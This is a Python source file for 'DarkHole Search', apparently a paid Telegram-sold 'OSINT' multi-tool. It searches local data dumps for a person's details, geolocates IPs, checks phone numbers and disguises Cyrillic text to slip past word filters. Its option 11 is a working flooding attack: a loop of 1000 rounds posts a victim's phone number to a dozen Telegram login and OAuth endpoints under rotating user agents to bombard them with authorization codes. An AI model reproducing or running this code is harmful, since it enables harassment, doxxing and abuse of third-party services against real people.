import os
import subprocess
import random
import phonenumbers
import requests
import time
import sys
import pystyle
import glob
import hashlib
import uuid
import platform
import psutil
import aiohttp
import logging
import json
from datetime import datetime
from datetime import datetime, timedelta
from pathlib import Path
from pystyle import * 
from bs4 import BeautifulSoup
from phonenumbers import geocoder, carrier, timezone

COLOR_CODE = {
    "RESET": "\033[0m",  
    "UNDERLINE": "\033[04m", 
    "GREEN": "\033[32m",     
    "YELLOW": "\033[93m",    
    "RED": "\033[31m",       
    "CYAN": "\033[36m",     
    "BOLD": "\033[01m",        
    "PINK": "\033[95m",
    "URL_L": "\033[36m",       
    "LI_G": "\033[92m",      
    "F_CL": "\033[0m",
    "DARK": "\033[90m",     
}

def cls():
    input(Colorate.Horizontal(Colors.blue_to_purple,'\n[DarkHole] Enter the reload!'))
    os.system('cls' if os.name == 'nt' else 'clear')
    subprocess.run({'DarkHole Search.exe'})

def exit2():
    os.system("cls" if os.name == "nt" else "clear")
    subprocess.run({'DarkHole Search.exe'})

intro = '''\n\n\n\n\n\n\n\n
██████╗  █████╗ ██████╗ ██╗  ██╗██╗  ██╗ ██████╗ ██╗     ███████╗
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██║  ██║██╔═══██╗██║     ██╔════╝
██║  ██║███████║██████╔╝█████╔╝ ███████║██║   ██║██║     █████╗  
██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══██║██║   ██║██║     ██╔══╝  
██████╔╝██║  ██║██║  ██║██║  ██╗██║  ██║╚██████╔╝███████╗███████╗
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝
  
          Read it before launching - @DarkHoleProjects
   Welcome to DarkHole Multi-Tool! Press "Enter" to continue.
'''
login = '''
       ██████╗  █████╗ ██████╗ ██╗  ██╗██╗  ██╗ ██████╗ ██╗     ███████╗
       ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██║  ██║██╔═══██╗██║     ██╔════╝
       ██║  ██║███████║██████╔╝█████╔╝ ███████║██║   ██║██║     █████╗  
       ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══██║██║   ██║██║     ██╔══╝  
       ██████╔╝██║  ██║██║  ██║██║  ██╗██║  ██║╚██████╔╝███████╗███████╗
       ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝
'''
menu = '''
       ██████╗  █████╗ ██████╗ ██╗  ██╗██╗  ██╗ ██████╗ ██╗     ███████╗
       ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██║  ██║██╔═══██╗██║     ██╔════╝
       ██║  ██║███████║██████╔╝█████╔╝ ███████║██║   ██║██║     █████╗  
       ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══██║██║   ██║██║     ██╔══╝  
       ██████╔╝██║  ██║██║  ██║██║  ██╗██║  ██║╚██████╔╝███████╗███████╗
       ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝

       [MENU] - [@DarkHoleProjects]
       ┌───────────────────────────────┬──────────────────────────────┐
       │ 1 - GLOBAL SEARCH             │ 7 - WEB CRAWLING             │
       │ 2 - DATABASE SEARCH           │ 8 - SWAT BANWORD             │
       │ 3 - TELEGRAM SEARCH           │ 9 - INFO DATABASE            │
       │ 4 - VK HISTORY                │ 10 - INFORMATION             │
       │ 5 - NICKNAME SEARCH           │ 11 - SNOS SESSION            │
       │ 6 - IP SEARCH                 │ 12 - CHECK VALID PHONE       │
       ├───────────────────────────────┴──────────────────────────────┤
       │                       0 - EXIT TO TOOL                       │
       └──────────────────────────────────────────────────────────────┘
'''
os.system("title DarkHole Search [FULL]")
#Write.Print(Center.XCenter(menu), Colors.blue_to_purple, interval=0.001)
#Anime.Fade(Center.XCenter(intro), Colors.blue_to_purple, Colorate.Vertical, interval=0.030, enter=True)
print(Colorate.Horizontal(Colors.blue_to_purple,(menu)))
select = input(Colorate.Horizontal(Colors.blue_to_purple,'\n{{+}} Enter the option → '))
if select == '1':
    cls()
if select == '2':
    text_formats = ['.csv', '.txt', '.sql', '.xlsx', '.json', '.log']
    def slow_print(text, interval=0.01):
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(interval)

    def detect_delimiter(line, possible_delimiters=[',', '\t', ';', '|']):
        delimiter_counts = {delim: line.count(delim) for delim in possible_delimiters}
        if not any(delimiter_counts.values()):
            return None
        return max(delimiter_counts, key=delimiter_counts.get)

    def dbsearch(db, value):
        found_results = []
        try:
            with open(db, 'r', encoding='utf-8', errors='ignore') as f:
                first_line = f.readline().strip()
                delimiter = detect_delimiter(first_line)

                if delimiter is None:
                    return found_results

                headers = [header.strip().strip('"').strip("'").strip('\ufeff') for header in
                           first_line.split(delimiter)]
                headers = [h for h in headers if h]

            with open(db, 'r', encoding='utf-8', errors='ignore') as f:
                for line_num, line in enumerate(f):
                    if line_num == 0:
                        continue
                    if value in line:

                        data = [item.strip().strip('"').strip("'") for item in line.strip().split(delimiter)]
                        found_data = []
                        for i in range(len(headers)):
                            if i < len(data):
                                val = data[i] if data[i] else 'Not found'
                            else:
                                val = 'Not found'
                            found_data.append((headers[i], val))
                        if found_data:
                            found_results.append((db, found_data))
        except Exception as e:
            print(f'\n{COLOR_CODE["RED"]}{COLOR_CODE["BOLD"]}{{DarkHole}} Error: {str(e)}')
        return found_results

    def search_in_base_folder(value):
        start_time = time.time()
        all_found_results = []
        base_directory = 'database'
        db_files = [file for ext in text_formats for file in glob.glob(os.path.join(base_directory, '*' + ext))]

        try:
            for db in db_files:
                found_results = dbsearch(db, value)
                if found_results:
                    all_found_results.extend(found_results)
                    for db_name, result in found_results:
                        pystyle.Write.Print(f"\n{{#}} → BASE DATA: {os.path.basename(db_name)}",
                                            pystyle.Colors.blue_to_purple, interval=0.001)
                        print("")
                        for key, val in result:
                            pystyle.Write.Print(f"\n   {{+}} → {key}: {val}", pystyle.Colors.blue_to_purple,
                                                interval=0.001)
                        print()
        except Exception as ex:
            print(f'\n{COLOR_CODE["RED"]}{COLOR_CODE["BOLD"]}{{DarkHole}} Error: {str(ex)}')
        finally:
            print("")
            print(f'\n{COLOR_CODE["RED"]}{COLOR_CODE["BOLD"]}{{DarkHole}} Search completed successfully!')
            cls()

    def main():
        search_query = input(Colorate.Horizontal(Colors.blue_to_purple,'{{+}} Enter the value → '))
        search_in_base_folder(search_query)

    if __name__ == '__main__':
        main()

if select == '3':
    cls()
if select == '4':
    cls()
if select == '5':
    cls()
if select == '6':
     def get_ip_info(ip_address):
         try:
            url = f"https://ipinfo.io/{ip_address}/json"
            response = requests.get(url, timeout=10)
            response.raise_for_status()
            return response.json()
         except Exception:
            return {}

     def get_ip_type(ip_address):
         try:
            url = f"https://ipwho.is/{ip_address}"
            response = requests.get(url, timeout=10)
            response.raise_for_status()
            return response.json()
         except Exception:
            return {}

     def color_text(text, is_section=False):
        formatted_text = f"\n{{#}} → {text}\n" if is_section else f"   {{+}} {text}\n"
        Write.Print(formatted_text, Colors.blue_to_purple, interval=0.001)

     def print_section(title):
        color_text(title, is_section=True)

     def ipsearch(ip_address):
        ip_info = get_ip_info(ip_address)
        ip_type_info = get_ip_type(ip_address)

        print_section("General information")
        color_text(f"IP Address: {ip_info.get('ip', 'unavailable')}")
        color_text(f"City: {ip_info.get('city', 'unavailable')}")
        color_text(f"Region: {ip_info.get('region', 'unavailable')}")
        color_text(f"Country: {ip_type_info.get('country', 'unavailable')} {ip_type_info.get('country_code', '')}")
        color_text(f"Continent: {ip_type_info.get('continent', 'unavailable')} {ip_type_info.get('continent_code', '')}")
        color_text(f"Timezone: {ip_info.get('timezone', 'unavailable')}")
        color_text(f"Languages: {ip_type_info.get('languages', 'unavailable')}")
        color_text(f"Postal Code: {ip_type_info.get('postal', 'unavailable')}")
        color_text(f"Calling Code: +{ip_type_info.get('calling_code', 'unavailable')}")

        print_section("Geolocation")
        if 'loc' in ip_info: 
          latitude, longitude = ip_info['loc'].split(',')
          color_text(f"Coordinates: {ip_info['loc']}")
          color_text(f"Google Maps: https://www.google.com/maps?q={latitude},{longitude}")
          color_text(f"Yandex Maps: https://yandex.ru/maps/?ll={longitude},{latitude}&z=10")
          color_text(f"OpenStreetMap: https://www.openstreetmap.org/?mlat={latitude}&mlon={longitude}&zoom=12")
        else:
           print(f'\n{COLOR_CODE["RED"]}{COLOR_CODE["BOLD"]}{{DarkHole}} Coordinates unavailable')

        print_section("Technical information")
        color_text(f"IP Type: {ip_type_info.get('type', 'unavailable')}")
        color_text(f"Hostname: {ip_info.get('hostname', 'unavailable')}")
        color_text(f"ASN: {ip_type_info.get('asn', {}).get('asn', 'unavailable')}")
        color_text(f"ISP: {ip_type_info.get('asn', {}).get('name', 'unavailable')}")
        color_text(f"Organization: {ip_info.get('org', 'unavailable')}")
        color_text(f"Mobile: {'Yes' if ip_type_info.get('connection', {}).get('mobile', False) else 'No'}")
        color_text(f"Proxy: {'Yes' if ip_type_info.get('proxy', False) else 'No'}")
        color_text(f"VPN: {'Yes' if ip_type_info.get('vpn', False) else 'No'}")
        color_text(f"TOR: {'Yes' if ip_type_info.get('tor', False) else 'No'}")

        print_section("Lot database search")
        color_text(f"Shodan: https://www.shodan.io/search?query={ip_address}")
        color_text(f"Censys: https://censys.io/ipv4/{ip_address}")
        color_text(f"Zoomeye: https://www.zoomeye.org/searchResult?q={ip_address}")
        color_text(f"CriminalIP: https://www.criminalip.io/asset/report/{ip_address}")
        color_text(f"VirusTotal: https://www.virustotal.com/gui/ip-address/{ip_address}")

        print_section("Whois record check")
        color_text(f"Whois Lookup: https://who.is/whois/{ip_address}")
        color_text(f"IPinfo Whois: https://ipinfo.io/{ip_address}/whois")
        color_text(f"AbuseIPDB: https://www.abuseipdb.com/check/{ip_address}")
        color_text(f"Spamhaus: https://check.spamhaus.org/listed/?searchterm={ip_address}")
        color_text(f"RIPEstat: https://stat.ripe.net/{ip_address}")
        cls()

     def ip_search_start():
         ip_address = input(f'{COLOR_CODE["RED"]}{{+}} Enter the ip-address → {COLOR_CODE["RESET"]}')
         ipsearch(ip_address)

     if __name__ == "__main__":
         ip_search_start()

if select == '7':
    def crawl(url):
        try:
            response = requests.get(url)

            if response.status_code == 200:
                soup = BeautifulSoup(response.content, 'html.parser')

                title = soup.title.text
                Write.Print(f"{{+}} Title: {title}", Colors.red_to_purple, interval=0.001)

                links = soup.find_all('a')
                Write.Print(f"{{+}} Url to website: {len(links)}", Colors.red_to_purple, interval=0.001)

                for link in links:
                    print(link.get('href'))
            else:
                print(f'\n{COLOR_CODE["RED"]}{COLOR_CODE["BOLD"]}{{DarkHole}} Error: {response.status_code}')

        except requests.RequestException as e:
            print(f'\n{COLOR_CODE["RED"]}{COLOR_CODE["BOLD"]}{{DarkHole}} Error: {str(e)}')

    if __name__ == '__main__':
        url = input(Colorate.Horizontal(Colors.blue_to_purple,'{{+}} Enter the url → '))
        crawl(url)
        cls()

if select == '8':
    def transform_text(input_text):
        translit_dict = {
            'а': '@',
            'б': 'Б',
            'в': 'B',
            'г': 'г',
            'д': 'д',
            'е': 'е',
            'ё': 'ё',
            'ж': 'ж',
            'з': '3',
            'и': 'u',
            'й': 'й',
            'к': 'K',
            'л': 'л',
            'м': 'M',
            'н': 'H',
            'о': '0',
            'п': 'п',
            'р': 'P',
            'с': 'c',
            'т': 'T',
            'у': 'y',
            'ф': 'ф',
            'х': 'X',
            'ц': 'ц',
            'ч': '4',
            'ш': 'ш',
            'щ': 'щ',
            'ъ': 'ъ',
            'ы': 'ы',
            'ь': 'ь',
            'э': 'э',
            'ю': 'ю',
            'я': 'я'
        }

        transformed_text = []

        for char in input_text:
            if char in translit_dict:
                transformed_text.append(translit_dict[char])
            else:
                transformed_text.append(char)

        return ''.join(transformed_text)

    input_text = input(Colorate.Horizontal(Colors.blue_to_purple,'{{+}} Enter the text → '))
    transformed_text = transform_text(input_text)
    Write.Print(f"{{+}} Ready text → {transformed_text}", Colors.blue_to_purple, interval=0.001)
    cls()

if select == '9':
    def format_size(size):
        units = ['Б', 'КБ', 'МБ', 'ГБ', 'ТБ']
        index = 0
        while size >= 1024 and index < len(units) - 1:
            size /= 1024
            index += 1
        return f"{size:.2f} {units[index]}"

    def get_folder_info(folder_path):
        total_files = 0
        total_size = 0

        for root, dirs, files in os.walk(folder_path):
            total_files += len(files)
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    total_size += os.path.getsize(file_path)
                except OSError:
                    pass

        return total_files, total_size

    def main():
        folder_path = 'database'

        if not os.path.isdir(folder_path):
            print(f"\n{COLOR_CODE['RED']}{COLOR_CODE['BOLD']}{{DarkHole}} Error: folder 'database' Not found")
            return

        total_files, total_size = get_folder_info(folder_path)
        Write.Print(f"\n   {{+}} → Folder: base", pystyle.Colors.blue_to_purple, interval=0.025)
        Write.Print(f"\n   {{+}} → Files: {total_files}", pystyle.Colors.blue_to_purple, interval=0.025)
        Write.Print(f"\n   {{+}} → Total size: {format_size(total_size)}", pystyle.Colors.blue_to_purple,
                    interval=0.025)
        print()

    if __name__ == "__main__":
        main()
    cls()

if select == '10':
    Write.Print(f'''
 1 - OWNER: Ps1xologov
 2 - PRICE: 3$/300р
 3 - SELLER: @DarkholeMarket_bot
 4 - CHANNEL: https://t.me/+OxbEE8lDuIQyMmIy
 5 - SOFT NAME: "DarkHole Search"
 6 - TYPE SOFT: "OSINT SEARCH"
 7 - VERSION: 1.0
''', Colors.blue_to_purple, interval=0.001)
    cls()

if select == '11':
    number = input(Colorate.Horizontal(Colors.blue_to_purple,'{{+}} Enter the phone → '))
    count = 0
    try:
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
            'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362',
            'Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
            'Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
            'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36'
        ]
        for _ in range(1000):
            headers = {
                'User-Agent': random.choice(user_agents)
                
            }
            requests.post('https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin', headers=headers, data={'phone': number})
            requests.post('https://translations.telegram.org/auth/request', headers=headers, data={'phone': number})
            requests.post('https://translations.telegram.org/auth/request', headers=headers, data={'phone': number})
            requests.post('https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1', headers=headers, data={'phone': number})
            requests.post('https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1', headers=headers, data={'phone': number})
            requests.post('https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23', headers=headers, data={'phone': number})
            requests.post('https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin', headers=headers, data={'phone': number})
            requests.post('https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F', headers=headers, data={'phone': number})
            requests.post('https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin', headers=headers, data={'phone': number})
            requests.post('https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch', headers=headers, data={'phone': number})
            requests.post('https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin', headers=headers, data={'phone': number})
            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
            count += 1
            print(f"{COLOR_CODE['RED']}{{DarkHole}} Codes sent successfully!")
            print(f"{COLOR_CODE['RED']}{{DarkHole}} Circles sent: {count}")
    except Exception as e:
        print(f"{COLOR_CODE['RED']}{{DarkHole}} Error check your input data: {e} {COLOR_CODE['RESET']}")

if select == '12':
    search_value = input(Colorate.Horizontal(Colors.blue_to_purple,'{{+}} Enter the phone → '))

    try:
        parsed_number = phonenumbers.parse(search_value, None)

        if not phonenumbers.is_valid_number(parsed_number):
            print(f'{COLOR_CODE["RED"]}{{DarkHole}} Incorrect number format!')
            cls()
        else:
            country = geocoder.description_for_number(parsed_number, "ru")
            operator = carrier.name_for_number(parsed_number, "ru")
            number_type = phonenumbers.number_type(parsed_number)
            timezone_info = timezone.time_zones_for_number(parsed_number)

            pystyle.Write.Print(f"\n{{#}} → SERVICE: darkhole checker",pystyle.Colors.blue_to_purple, interval=0.001)
            Write.Print(f"\n   {{@}} Country → {country}" , Colors.blue_to_purple, interval=0.001)
            Write.Print(f"\n   {{@}} Operator → {operator}" , Colors.blue_to_purple, interval=0.001)
            Write.Print(f"\n   {{@}} Phone type → {number_type}" , Colors.blue_to_purple, interval=0.001)
            Write.Print(f"\n   {{@}} Time zone → {timezone_info}" , Colors.blue_to_purple, interval=0.001)
            print("")
            cls()

    except phonenumbers.phonenumberutil.NumberParseException:
        print(f'{COLOR_CODE["RED"]}{{DarkHole}} Invalid number')
        cls()